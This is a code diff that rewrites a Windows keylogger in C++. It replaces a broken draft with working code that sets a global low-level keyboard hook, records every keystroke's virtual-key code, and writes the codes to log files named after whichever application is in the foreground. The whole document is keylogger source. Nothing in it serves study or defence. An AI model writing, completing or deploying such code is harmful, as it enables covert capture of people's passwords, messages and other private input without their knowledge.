@@ -1,47 +1,82 @@
-#include "../includes/keylogger.hpp"
-#include <iostream>
-#include <fstream>
-void __ft_writeTofile(const char *text)
-{
-    ;
-}
+#include "../includes/includes.hpp"
 
-static BOOL __is_printable_key(int key)
-{
-    // all the ASCII unmapped keys should be specified here using WINDOWS macros 
-    switch(key)
-    {
-        case VK_RBUTTON:
-            std::cout << " [RightClick] " << std::endl;
-            __ft_writeTofile(" [RightClick] ");
-            break;
-        case VK_LBUTTON:
-            __ft_writeTofile(" [LeftClick] ");
-            break;
-        default:
-            return TRUE;
+HHOOK keyboardHook;
+std::ofstream outputFile;
+std::string currentProcessName;
+
+std::string GetActiveProcessName() {
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd == NULL) return "Unknown";
+
+    DWORD pid;
+    GetWindowThreadProcessId(hwnd, &pid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess == NULL) return "Unknown";
+
+    char processName[MAX_PATH];
+    if (GetModuleBaseName(hProcess, NULL, processName, sizeof(processName) / sizeof(char)) > 0) {
+        CloseHandle(hProcess);
+        return std::string(processName);
+    } else {
+        CloseHandle(hProcess);
+        return "Unknown";
     }
 }
 
-int __keyStrokeslogger(int ac, char **av)
-{
-    char        key;
+void StartNewLogFile(const std::string& processName) {
+    if (outputFile.is_open()) {
+        outputFile.close();
+    }
 
-    while (TRUE)
-    {    
-        for (key = 8; key >= 190; key++)
-        {
-            if (GetAsyncKeyState(key) == -32767)
-            {
-                if (__is_printable_key(key) == TRUE)
-                {
-                    ofstream logfile;
-                    logfile.open("logfile.txt", fstream::ap)
-                    logfile << key;
-                    logfile.close();
-                }
-            }    
+    std::string fileName = processName + "_keylogs.txt";
+    outputFile.open(fileName, std::ios::out | std::ios::app);
+    if (!outputFile.is_open()) {
+        MessageBox(NULL, "Failed to open log file!", "Error", MB_ICONERROR);
+        exit(1);
+    }
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            std::string newProcessName = GetActiveProcessName();
+            if (newProcessName != currentProcessName) {
+                currentProcessName = newProcessName;
+                StartNewLogFile(currentProcessName);
+            }
+
+            DWORD vkCode = pKeyboard->vkCode;
+            outputFile << vkCode << std::endl;
         }
     }
-    return (0);
+    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+}
+
+void SetHook() {
+    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
+}
+
+void Unhook() {
+    UnhookWindowsHookEx(keyboardHook);
+}
+
+int main() {
+    currentProcessName = GetActiveProcessName();
+    StartNewLogFile(currentProcessName);
+
+    SetHook();
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    Unhook();
+    if (outputFile.is_open()) {
+        outputFile.close();
+    }
+    return 0;
 }
